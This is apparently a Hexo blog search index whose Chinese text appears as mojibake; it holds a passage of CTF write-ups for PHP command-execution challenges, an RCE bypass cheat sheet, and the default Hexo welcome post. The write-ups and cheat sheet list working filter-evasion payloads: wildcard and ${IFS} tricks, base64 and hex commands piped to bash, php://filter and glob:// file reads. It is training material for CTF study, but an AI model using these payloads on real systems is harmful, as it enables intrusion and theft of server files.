1.txtç„¶åè®¿é—®1.txt</p><p>44å‘¢å’Œ43å·®ä¸å¤š,å°±å¤šäº†ä¸€ä¸ªflag,å¯ä»¥?l*.php</p><p>45(å¤šäº†cat):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;     system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); </span><br></pre></td></tr></table></figure><p>palyad:c&#x3D;uniq${IFS}?l*.php||</p><p>46-53:</p><p>éƒ½å·®ä¸å¤šï¼Œå¯ä»¥å¤šè®°ç‚¹æ›¿ä»£catçš„å’Œsystemä»¥åŠç©ºæ ¼çš„</p><p>54ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ äº†å¾ˆå¤šå‘½ä»¤ã€‚ ä¸­é—´è¿™äº›ä¸ªå¾ˆå¤šçš„æ˜Ÿå·çš„å†…å®¹ï¼Œå…¶å® æ˜¯è¯´ï¼Œå«æœ‰ cat,moreè¿™æ ·çš„ä¼šè¢«åŒ¹é…ï¼Œå¦‚cat é‚£ä¹ˆca323390ftæˆ–c232fa3kdfst, å‡¡æ˜¯æŒ‰åºå‡ºç°äº†cat éƒ½è¢«åŒ¹é…ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å†™ca?å› ä¸ºè¿™æ ·æ˜¯åŒ¹é…ä¸åˆ°å‘½ä»¤çš„ã€‚ åªèƒ½æŠŠå…¨è·¯å¾„å†™å‡ºæ¥ï¼Œå¦‚&#x2F;bin&#x2F;ca?,ä¸&#x2F;bin&#x2F;ca?åŒ¹é…çš„ï¼Œåªæœ‰&#x2F;bin&#x2F;catå‘½ä»¤ï¼Œè¿™æ ·å°±ç”¨åˆ°äº†cat å‘½ä»¤äº†ã€‚</p><p>äºæ˜¯ï¼Œæœ‰äº†payload</p><p>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}????.???   ç„¶å   æŸ¥çœ‹æºç </p><p>55:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>ç”±äºè¿‡æ»¤äº†å­—æ¯ï¼Œä½†æ²¡æœ‰è¿‡æ»¤æ•°å­—å¯ä»¥è€ƒè™‘æ•°å­—ç¼–ç ï¼š$â€™\164\141\143â€™ $â€™\146\154\141\147\56\160\150\160â€™</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨é€šé…ç¬¦?æ¥è¿›è¡Œä»£æ›¿</p><p>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><p>æ›¿æ¢åå˜æˆ</p><p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p><p>56+57ï¼šè¿™ä¸ªçš„è¯æ²¡çœ‹æ˜ç™½</p><p>58-65ï¼š</p><p>è¿›è¡Œpostä¼ c,å¹¶ä¸”eval($c)</p><p>è¿™é‡Œå˜›ï¼Œè¦å¼•å…¥æ–°çš„å‡½æ•°ï¼šshow_source,highlight_file;è¿™ä¸¤ä¸ªéƒ½æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤º</p><p>é‚£ä¹ˆpalyadå°±å‡ºæ¥äº†ï¼šc&#x3D;show_source(â€˜flag.phpâ€™);&#x2F;highlight_file(â€˜flag.phpâ€™);</p><p>æˆ–è€…å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«å†™ï¼šc&#x3D;include($_POST[â€˜wâ€™]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>66-67:</p><p>è¿™ä¸ªå‘¢å¼•å…¥ä¸€ä¸ªæ–°çš„ä¸œè¥¿ï¼šprint_r(scandir(â€œ&#x2F;â€œ));(print_ræˆ–è€…ä¹Ÿå¯ä»¥æ¢æˆvar_dump&#x2F;var_export)å’Œå‰é¢çš„ä¸€æ ·ä¸è¿‡åœ¨æœ¬ç›®å½•ä¸‹é¢æ²¡æœ‰flag.php&#x2F;txt,é‚£ä¸ªæ–°çš„ä¸œè¥¿æ˜¯æŸ¥çœ‹æŒ‡å®šçš„ç›®å½•ï¼Œå…ˆè¿”å›æ ¹ç›®å½•ï¼Œç„¶åå°±å‘ç°æ ¹ç›®å½•ä¸‹é¢å­˜åœ¨ç€flag.txtï¼Œé‚£ä¸ªå°±å¯ä»¥show_source(â€œ&#x2F;flag.txtâ€);æˆ–è€…å¦ä¸€ä¸ªï¼›</p><p>68-70:</p><p>è¿™ä¸€å…³ç¦ç”¨äº†highlight_fileã€‚ä¾ç„¶å¯ä»¥ä½¿ç”¨ä¸Šä¸€å…³çš„var_dumpç»“åˆscandiræ¥æ˜¾ç¤ºæ ¹ç›®å½•çš„æ–‡ä»¶åˆ—è¡¨ã€‚<br> c&#x3D;var_dump(scandir(â€˜&#x2F;â€˜));ä¹‹åshow_sourceå’Œhighlight_fileéƒ½ç”¨ä¸äº†,è¯•è¯•includeå’Œrequireå³å¯ã€‚</p><p>71ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçš„è¯ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä»–å°†æ•°å­—å’Œå­—æ¯æ¢æˆï¼Ÿäº†ï¼Œé‚£ä¸ªå¯ä»¥åˆ©ç”¨ç¼“å†²åŒºç”¨exit();ç»“æŸ</p><p>æå‰ç»ˆæ­¢ç¨‹åºï¼Œå³æ‰§è¡Œå®Œä»£ç ç›´æ¥é€€å‡ºï¼Œå¯ä»¥è°ƒç”¨çš„å‡½æ•°æœ‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>ç„¶åçš„è¯å°±æ˜¯ä½¿ç”¨c&#x3D;var_exportè¿›è¡Œæ‰«ææ–‡ä»¶æ ¹ç›®å½•ï¼šc&#x3D;var_export(scandir(â€œ&#x2F;â€œ));exit;å†c&#x3D;include(â€œ&#x2F;flag.txtâ€);exit();</p><p>å‰©ä¸‹çš„ä»¥åå†è¯´ï¼Œæœ‰ç‚¹ä¸ä¼šäº†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/03/02/RCE/"/>
      <url>/2025/03/02/RCE/</url>
      
        <content type="html"><![CDATA[<p>RCE:</p><p>1.ç®€è¿°ï¼š</p><p>åœ¨å¾ˆå¤šWebåº”ç”¨ä¸­ï¼Œå¼€å‘äººå‘˜ä¼šä½¿ç”¨ä¸€äº›ç‰¹æ®Šå‡½æ•°ï¼Œè¿™äº›å‡½æ•°ä»¥ä¸€äº›å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥ï¼ŒåŠŸèƒ½æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²å½“ä½œä»£ç æˆ–è€…å‘½ä»¤æ¥è¿›è¡Œæ‰§è¡Œã€‚å½“ç”¨æˆ·å¯ä»¥æ§åˆ¶è¿™äº›å‡½æ•°çš„è¾“å…¥æ—¶ï¼Œå°±äº§ç”Ÿäº†RCEæ¼æ´ã€‚</p><p>å±å®³ï¼šå¯ä»¥è®©ç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯ç³»ç»Ÿç®¡ç†å‘˜æˆ–æ™®é€šç”¨æˆ·ï¼‰æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤çš„æ¼æ´ã€‚è¿™ç§æ¼æ´é€šå¸¸å­˜åœ¨äºæŸäº›ç¨‹åºæˆ–è„šæœ¬ä¸­ï¼Œå…è®¸è¾“å…¥å‚æ•°è¢«ç¼–ç å¹¶ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p> æ¯”å¦‚ï¼šå¦‚æœåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£ï¼Œæ¯”å¦‚å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šï¼Œä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚è€Œå¦‚æœè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ã€‚</p><p>2.åˆ†ç±»ï¼šå‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œ</p><p>3.å¸¸è§å‡½æ•°ï¼š</p><p> (1)å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š</p><p>system()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œä¸”è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼›</p><p>exec()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯åªè¿”å›æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œ(çº¦ç­‰äºæ— å›æ˜¾)ï¼›</p><p>shell_exec()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œ</p><p>passthru()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œåªè°ƒç”¨å‘½ä»¤ä¸è¿”å›ä»»ä½•ç»“æœï¼Œä½†æŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šï¼›</p><p>popen()ï¼šæ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆ</p><p>proc_open()ï¼šä¸popen()ç±»ä¼¼</p><p>pcntl_exec()ï¼šåœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åºï¼›</p><p>åå¼•å·<code>ï¼šåå¼•å·</code>å†…çš„å­—ç¬¦ä¸²ä¼šè¢«è§£æä¸ºOSå‘½ä»¤ï¼›</p><p>è¡¥å……ï¼šOSå‘½ä»¤æ‰§è¡Œæ˜¯æŒ‡å°†ç”¨æˆ·çš„æ–‡æœ¬å‘½ä»¤é€šè¿‡æ“ä½œç³»ç»Ÿè½¬åŒ–ä¸ºäºŒè¿›åˆ¶æŒ‡ä»¤å¹¶æ‰§è¡Œçš„è¿‡ç¨‹</p><p>(2)ä»£ç æ‰§è¡Œå‡½æ•°ï¼š</p><p>eval()ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œï¼›</p><p>assert()ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œï¼›</p><p>preg_replace()ï¼šæ­£åˆ™åŒ¹é…æ›¿æ¢å­—ç¬¦ä¸²ï¼›</p><p>create_function()ï¼šä¸»è¦åˆ›å»ºåŒ¿åå‡½æ•°ï¼›</p><p>call_user_func()ï¼šå›è°ƒå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°çš„å‚æ•°ï¼›</p><p>call_user_func_array()ï¼šå›è°ƒå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°å‚æ•°çš„æ•°ç»„ï¼›</p><p>å¯å˜å‡½æ•°ï¼šè‹¥å˜é‡åæœ‰æ‹¬å·ï¼Œè¯¥å˜é‡ä¼šè¢«å½“åšå‡½æ•°åä¸ºå˜é‡å€¼(å‰ææ˜¯è¯¥å˜é‡å€¼æ˜¯å­˜åœ¨çš„å‡½æ•°å)çš„å‡½æ•°æ‰§è¡Œï¼›</p><p>4.å¸¸è§ç»•è¿‡ï¼š</p><p>(1)ç®¡é“ç¬¦ç»•è¿‡ï¼š</p><p>ï¼›ï¼šå³ï¼›å‰åéƒ½æ‰§è¡Œ</p><p>&amp;ï¼šå³&amp;å‰åéƒ½æ‰§è¡Œ</p><p>&amp;&amp;ï¼šå³å¦‚æœ&amp;&amp;å‰ä¸ºçœŸæ‰æ‰§è¡Œ&amp;&amp;åé¢çš„ï¼Œä¸ç„¶åªæ‰§è¡Œ&amp;&amp;å‰é¢çš„</p><p>| ï¼šå³æ˜¾ç¤º|åé¢çš„æ‰§è¡Œç»“æœ</p><p>||ï¼š||å‰é¢ä¸ºå‡æ—¶æ‰æ‰§è¡Œ||åé¢çš„ï¼Œå¦åˆ™åªæ‰§è¡Œ||å‰é¢çš„</p><p>(2)ç©ºæ ¼è¿‡æ»¤ï¼š</p><p>ç©ºæ ¼å¯ä»¥æ›¿æ¢æˆï¼š</p><p>&lt;  &lt;&gt;  %20(å³space) %09(å³TAB)  $IFS$9  ${IFS}  $IFS  {}</p><p>(3)åæ–œæ ï¼š</p><p>å¦‚catã€lsè¢«è¿‡æ»¤ï¼Œä½¿ç”¨\ç»•è¿‡ï¼š<br>c\at &#x2F;flag<br>l\s &#x2F;</p><p>(4)å–åç»•è¿‡ï¼š</p><p>&#x2F;&#x2F;å–åä¼ å‚<br>&lt;?php</p><p>$a &#x3D; â€œsystemâ€;<br>$b &#x3D; â€œcat &#x2F;flagâ€;</p><p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p><p>&#x2F;&#x2F;è¾“å‡ºå¾—åˆ°å–åä¼ å‚å†…å®¹<br>echo â€œ?cmd&#x3D;(<del>â€œ.$c.â€)(</del>â€œ.$d.â€);â€<br>?&gt;</p><p>(5)å¼‚æˆ–ç»•è¿‡:</p><p>è¿™é‡Œæ¨èyuå¸ˆå‚…çš„è„šæœ¬</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p>(6)é»‘åå•ç»•è¿‡ï¼š</p><p>&#x2F;&#x2F;å˜é‡æ‹¼æ¥ï¼Œå¦‚flagè¢«è¿‡æ»¤<br>å°†ï¼š<br>cat &#x2F;flag<br>æ›¿æ¢ä¸ºï¼š<br>b&#x3D;ag;cat &#x2F;fl$b</p><p>&#x2F;&#x2F;è¯»å–æ ¹ç›®å½•<br>eval(var_dump(scandir(â€˜&#x2F;â€˜););<br>&#x2F;&#x2F;è¯»flag<br>eval(var_dump(file_get_contents($_POST[â€˜aâ€™])););&amp;a&#x3D;&#x2F;flag</p><p>&#x2F;&#x2F;ç­‰æ•ˆäºæ‰“å¼€lsç›®å½•ä¸‹çš„æ–‡ä»¶<br>cat <code>ls</code></p><p>&#x2F;&#x2F;<em>è¢«è¿‡æ»¤ï¼Œphp8ä»¥ä¸‹ï¼Œå˜é‡åä¸­çš„ç¬¬ä¸€ä¸ªéæ³•å­—ç¬¦[ä¼šè¢«æ›¿æ¢ä¸ºä¸‹åˆ’çº¿</em><br>N[S.Sç­‰æ•ˆäºN_S.S<br>phpéœ€è¦æ¥æ”¶e_v.a.lå‚æ•°,ç»™e[v.a.lä¼ å‚å³å¯</p><p>&#x2F;&#x2F;phpæ ‡ç­¾ç»•è¿‡<br>?&gt;<?= phpinfo(); ?></p><p>(7)baseå’Œhexoç¼–ç ç»•è¿‡ï¼š</p><p>&#x2F;&#x2F;base64ç¼–ç ç»•è¿‡,ç¼–ç cat &#x2F;flagï¼Œåå¼•å·ã€| bashã€$()ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br><code>echo Y2F0IC9mbGFn | base64 -d</code><br>echo Y2F0IC9mbGFn | base64 -d | bash<br>$(echo Y2F0IC9mbGFn | base64 -d)</p><p>&#x2F;&#x2F;hexç¼–ç ç»•è¿‡ï¼Œç¼–ç cat &#x2F;flag,| bashç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>echo â€˜636174202f666c6167â€™ | xxd -r -p | bash</p><p>&#x2F;&#x2F;shellcodeç¼–ç <br>&#x2F;&#x2F;åå…­è¿›åˆ¶ç¼–ç </p><p>(8)æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼š</p><p>&#x2F;&#x2F;å¦‚flagè¢«è¿‡æ»¤<br>cat &#x2F;f???<br>cat &#x2F;fl*<br>cat &#x2F;f[a-z]{3}</p><p>cat &#x2F;?l*</p><p>(9)å¼•å·ç»•è¿‡ï¼š</p><p>&#x2F;&#x2F;å¦‚catã€lsè¢«è¿‡æ»¤*</p><p>caâ€â€t &#x2F;flag</p><p>lâ€™sâ€™ &#x2F;</p><p>(10)catæ›¿æ¢å‘½ä»¤ï¼š</p><p>tacä¸catç›¸åï¼ŒæŒ‰è¡Œåå‘è¾“å‡º<br>moreæŒ‰é¡µæ˜¾ç¤ºï¼Œç”¨äºæ–‡ä»¶å†…å®¹è¾ƒå¤šä¸”ä¸èƒ½æ»šåŠ¨å±å¹•æ—¶æŸ¥çœ‹æ–‡ä»¶<br>lessä¸moreç±»ä¼¼<br>tailæŸ¥çœ‹æ–‡ä»¶æœ«å‡ è¡Œ<br>headæŸ¥çœ‹æ–‡ä»¶é¦–å‡ è¡Œ<br>nlåœ¨catæŸ¥çœ‹æ–‡ä»¶çš„åŸºç¡€ä¸Šæ˜¾ç¤ºè¡Œå·<br>odä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»æ–‡ä»¶ï¼Œod -A d -c &#x2F;flagè½¬äººå¯è¯»å­—ç¬¦<br>xxdä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»æ–‡ä»¶ï¼ŒåŒæ—¶æœ‰å¯è¯»å­—ç¬¦æ˜¾ç¤º<br>sortæ’åºæ–‡ä»¶<br>uniqæŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶çš„é‡å¤è¡Œ<br>file -fæŠ¥é”™æ–‡ä»¶å†…å®¹<br>grepè¿‡æ»¤æŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œgrep flag &#x2F;flag</p><p>strings(ä¹Ÿæ˜¯)</p><p>(11)æ— å›æ˜¾ç»•è¿‡ï¼š</p><p>&#x2F;&#x2F;æ— å›æ˜¾RCEï¼Œå¦‚exce()å‡½æ•°ï¼Œå¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°æ–‡ä»¶å†è®¿é—®æ–‡ä»¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åè®¿é—®1.txtå³å¯<br>ls &#x2F; | tee 1.txt<br>cat &#x2F;flag | tee 2.txt<br>&#x2F;&#x2F;eval()æ— è¾“å‡º<br>eval(print<code>c\at /flag</code>;)</p><p>(12)</p><p>æ— å‚æ•°RCE</p><p>â€‹    åˆ©ç”¨getallheaders()ã€get_defined_vars()ã€session_idç­‰ï¼›</p><p>æ— å­—æ¯æ•°å­—RCE</p><p>â€‹    å¼‚æˆ–ã€å–åã€è‡ªå¢ã€ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ ï¼›</p><p>(14)å–åç»•è¿‡ï¼š</p><p>&#x2F;&#x2F;å–åä¼ å‚<br>&lt;?php</p><p>$a &#x3D; â€œsystemâ€;<br>$b &#x3D; â€œcat &#x2F;flagâ€;</p><p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p><p>&#x2F;&#x2F;è¾“å‡ºå¾—åˆ°å–åä¼ å‚å†…å®¹<br>echo â€œ?cmd&#x3D;(<del>â€œ.$c.â€)(</del>â€œ.$d.â€);â€<br>?&gt;</p><p>(15)é•¿åº¦é™åˆ¶ï¼š</p><p>touch â€œagâ€</p><p>touch â€œfl\â€œ</p><p>touch â€œt \â€œ</p><p>touch â€œca\â€œ</p><p>ls -t</p><p>-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</p><p>ls -t &gt; shell</p><p>sh shell(è¯»å–flag)</p><p>ç©ºæ ¼\ ï¼š è¿™ä¸ªå…¶å®æ˜¯æ¢è¡Œã€‚<br>ls -t ï¼šæŒ‰ç…§æ—¶é—´å°†æ–‡æœ¬æ’åºè¾“å‡º<br>ls -t &gt; shellï¼šå°†ls -tçš„è¾“å‡ºå‚¨å­˜åˆ°shellæ–‡ä»¶ä¸­<br>æˆ‘ä»¬é¦–å…ˆæ˜¯ç”¨touchå‘½ä»¤åˆ›å»ºäº†å‡ ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯ä»–ä»¬çš„æ–‡ä»¶åæ˜¯æˆ‘ä»¬çš„ä¸»è¦ã€‚æˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ª\çš„åŸå› åœ¨äºï¼Œç¬¬ä¸€ä¸ª\ç”¨äºå°†åé¢çš„\å˜æˆå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ª\æ˜¯ç”¨æ¥å°†åé¢çš„æ–‡æœ¬è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä»¥ä¾¿ç”¨äºåé¢çš„æµ‹è¯•ã€‚</p><p>è¡¥å……ï¼š</p><p>å…³äºæœ‰ä¸€äº›å…¨æ˜¯æŠ¥é”™çš„ï¼›å°±æ¯”å¦‚ä½¿ç”¨var_export(scandir(â€œ&#x2F;â€œ));æ‰«ææ ¹ç›®å½•æ–‡ä»¶ç»“æœå‘ç°å…¨æ˜¯ï¼Ÿï¼ä»€ä¹ˆçš„ï¼›å°±æ˜¯å…¨ç»™ä½ æ›¿æ¢äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆ exit() å‡½æ•°æ‰§è¡Œphpä»£ç è®©åé¢çš„åŒ¹é…ç¼“å†²åŒºä¸æ‰§è¡Œç›´æ¥é€€å‡º</p><p>æå‰ç»ˆæ­¢ç¨‹åºï¼Œå³æ‰§è¡Œå®Œä»£ç ç›´æ¥é€€å‡ºï¼Œå¯ä»¥è°ƒç”¨çš„å‡½æ•°æœ‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ glob:&#x2F;&#x2F; ä¼ªåè®®ç»•è¿‡ open_basedirï¼Œè¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œpayloadï¼š</p><p>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?>æˆ–è€…c&#x3D;$a&#x3D;new DirectoryIterator(â€˜glob:&#x2F;&#x2F;&#x2F;*â€™);foreach($a as $f){echo($f-&gt;__toString().â€ â€œ);}exit(0);</p><p>c&#x3D;$a&#x3D;new DirectoryIterator(â€˜glob:&#x2F;&#x2F;&#x2F;*â€™);foreach($a as $f){echo($f-&gt;getFilename().â€ â€œ);} exit(0);</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/18/hello-world/"/>
      <url>/2025/02/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
